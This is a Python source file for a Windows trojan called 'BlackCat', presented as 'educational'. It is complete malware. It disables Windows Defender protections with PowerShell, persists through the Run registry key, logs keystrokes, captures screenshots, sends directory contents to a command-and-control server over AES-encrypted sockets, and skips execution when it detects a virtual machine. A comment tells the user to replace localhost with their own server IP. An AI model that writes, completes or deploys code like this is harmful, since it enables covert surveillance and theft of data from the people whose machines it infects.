""" 
This is a simple implementation of a trojan for educational purposes only.

Running this on a real Windows machine would likely encounter several issues:

    - Security Protections: Modern Windows has multiple security layers that would detect or block this type of activity
    - Admin Privileges: Most of these functions (especially disabling Defender) require administrator privileges
    - Security Alerts: Disabling security features would trigger alerts and potentially notify the user
    - Command Validation: Current versions of Windows have stricter PowerShell security policies
    - Antivirus Detection: The behavior pattern would be flagged by most security solutions
"""

import socket
import sys
import subprocess
import winreg
import os
from Crypto.Cipher import AES
import base64
from pynput.keyboard import Listener
from PIL import ImageGrab
import io
import threading
import time

class BlackCat:
    """ Principal class for the trojan """

    def __init__(self, host, port, key):
        self.host = host
        self.port = port
        self.key = key.encode('utf-8')
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.running = True
        self.buffer = []

    def encrypt_data(self, data):
        """ Using AES to encrypt data and send it to the server """
        if isinstance(data, str):
            data = data.encode('utf-8')
        cipher = AES.new(self.key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return base64.b64encode(cipher.nonce + tag + ciphertext).decode('utf-8')

    def disable_defender(self):
        """ Disables Windows Security features """
        try:
            subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"], 
                            check=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableIOAVProtection $true"],
                            check=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableIntrusionPreventionSystem $true"],
                            check=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableBehaviorMonitoring $true"],
                            check=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableBlockAtFirstSeen $true"],
                            check=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableOnAccessProtection $true"],
                            check=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableNetworkProtection $true"],
                            check=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableScriptScanning $true"],
                            check=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.send_or_buffer("Windows Security features deactivated")
        except subprocess.CalledProcessError:
            self.send_or_buffer("Failed to deactivate Windows Security features")

    def add_to_startup(self):
        """ Tries to add the script to Windows startup """
        try:
            script_path = os.path.abspath(sys.argv[0])
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "BlackCat", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
            self.send_or_buffer("Added to startup")             
        except Exception as e:
            self.send_or_buffer(f"Failed to add to startup: {e}")

    def send_or_buffer(self, message):
        """ Send data to the server or buffer it if the connection is lost """
        encrypted = self.encrypt_data(message).encode('utf-8')
        try:
            self.socket.send(encrypted)
        except (ConnectionError, OSError):
            self.buffer.append(encrypted)
    
    def keylogger(self):
        """ Capture keystrokes and send them to the server """
        def on_press(key):
            if not self.running:
                return False
            self.send_or_buffer(str(key))
        listener = Listener(on_press=on_press)
        listener.start()

    def capture_screenshot(self):
        """ Capture a screenshot and send it to the server """
        screenshot = ImageGrab.grab()
        buffer = io.BytesIO()
        screenshot.save(buffer, format="PNG")
        self.send_or_buffer(buffer.getvalue())

    def send_files(self, directory):
        """ Send files from a directory to the server """
        try:
            for root, _, files in os.walk(directory):
                for file in files:
                    with open(os.path.join(root, file), 'rb') as f:
                        self.send_or_buffer(f.read())
        except Exception as e:
            self.send_or_buffer(f"Failed to send files: {e}")

    def is_vm(self):
        """ Check if the script is running in a virtual machine """
        return "VMware" in sys.executable or "VirtualBox" in sys.executable

    def command_loop(self):
        """ Main loop to receive commands from the server """
        try:
            # start the keylogger in a separate thread
            threading.Thread(target=self.keylogger, daemon=True).start()

            while self.running:
                command = self.socket.recv(1024).decode('utf-8')
                if not command:
                    break
                if command == "screenshot":
                    self.capture_screenshot()
                elif command.startswith("dir "):
                    self.send_files(command.split(" ")[1])
                elif command == "exit":
                    self.running = False
                elif command == "keylogger":
                    while True:
                        char = sys.stdin.read(1)
                        self.send_or_buffer(char)
        
        except Exception as e:
            self.send_or_buffer(f"Error in command loop: {e}")
        self.socket.close()

    def start(self):
        """ Starts BlackCat """
        if self.is_vm():
            self.send_or_buffer("Running in a virtual machine")
            return
                
        self.disable_defender()
        self.add_to_startup()

        while self.running:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.host, self.port))
                
                # try to send any buffered messages
                while self.buffer:
                    try:
                        self.socket.send(self.buffer[0])
                        self.buffer.pop(0)
                    except (ConnectionError, OSError):
                        break
                    
                self.command_loop()
            except (ConnectionRefusedError, OSError) as e:
                self.send_or_buffer(f"Connection error: {e}")
                time.sleep(5)

if __name__ == "__main__":
    cat = BlackCat("localhost", 27000, "your-secret-keey") # using localhost for testing, change to your server IP
    cat.start()